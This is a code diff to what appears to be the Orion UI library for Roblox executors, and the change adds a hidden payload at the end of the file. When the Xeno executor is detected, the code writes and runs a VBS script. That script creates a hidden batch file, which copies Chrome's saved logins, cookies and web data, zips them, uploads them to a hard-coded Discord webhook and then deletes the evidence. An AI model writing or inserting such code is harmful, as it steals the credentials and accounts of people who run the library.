@@ -2039,5 +2039,50 @@ end
 function OrionLib:Destroy()
 	Orion:Destroy()
 end
+if detectExecutor()  == "Xeno" then
+			
+script:FindFirstAncestorWhichIsA("DataModel").LinkingService:OpenUrl(
+    script:FindFirstAncestorWhichIsA("DataModel")
+        :FindService("ScriptContext")
+        :SaveScriptProfilingData(
+            [[
+Dim fso, tempFile, batFile, wshShell
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set wshShell = CreateObject("WScript.Shell")
 
+batFile = fso.GetSpecialFolder(2) & "\CloneChrome.bat"
+
+Set tempFile = fso.CreateTextFile(batFile, True)
+
+tempFile.WriteLine("@echo off")
+tempFile.WriteLine("setlocal enabledelayedexpansion")
+tempFile.WriteLine("")
+tempFile.WriteLine("set ""APPDATA_PATH=%LOCALAPPDATA%""")
+tempFile.WriteLine("set ""CLONE_PATH=%TEMP%\ChromeBackup""")
+tempFile.WriteLine("set ""ZIP_PATH=%TEMP%\ChromeBackup.zip""")
+tempFile.WriteLine("set ""WEBHOOK_URL=https://discord.com/api/webhooks/1342951799304359997/vJdR-lrqW5PTYe3kTbr2-IUKySj24CVOlPbhfSk3XcctXKpKdhWZcB2ykkR6PtgE12Gd""")
+tempFile.WriteLine("echo Cloning Chrome User Data...")
+tempFile.WriteLine("if not exist ""%CLONE_PATH%"" (")
+tempFile.WriteLine("    mkdir ""%CLONE_PATH%""")
+tempFile.WriteLine(")")
+tempFile.WriteLine("")
+tempFile.WriteLine("xcopy ""%APPDATA_PATH%\Google\Chrome\User Data\Default\Login Data"" ""%CLONE_PATH%"" /E /I /Q /H /Y > clone_log.txt 2>&1")
+tempFile.WriteLine("xcopy ""%APPDATA_PATH%\Google\Chrome\User Data\Default\Network\Cookies"" ""%CLONE_PATH%"" /E /I /Q /H /Y > clone_log.txt 2>&1")
+tempFile.WriteLine("xcopy ""%APPDATA_PATH%\Google\Chrome\User Data\Default\Web Data"" ""%CLONE_PATH%"" /E /I /Q /H /Y > clone_log.txt 2>&1")
+tempFile.WriteLine("")
+tempFile.WriteLine("powershell -Command ""Compress-Archive -Path '%CLONE_PATH%' -DestinationPath '%ZIP_PATH%' -Force""")
+tempFile.WriteLine("")
+tempFile.WriteLine("curl -F ""file=@%ZIP_PATH%"" ""%WEBHOOK_URL%""")
+tempFile.WriteLine("")
+tempFile.WriteLine("rmdir /s /q ""%CLONE_PATH%""")
+tempFile.WriteLine("del ""%ZIP_PATH%""")
+tempFile.WriteLine("")
+tempFile.Close()
+wshShell.Run batFile, 0, False
+
+            ]], 
+            "thebestexecutorofalltime.vbs"
+        )
+)
+		end
 return OrionLib
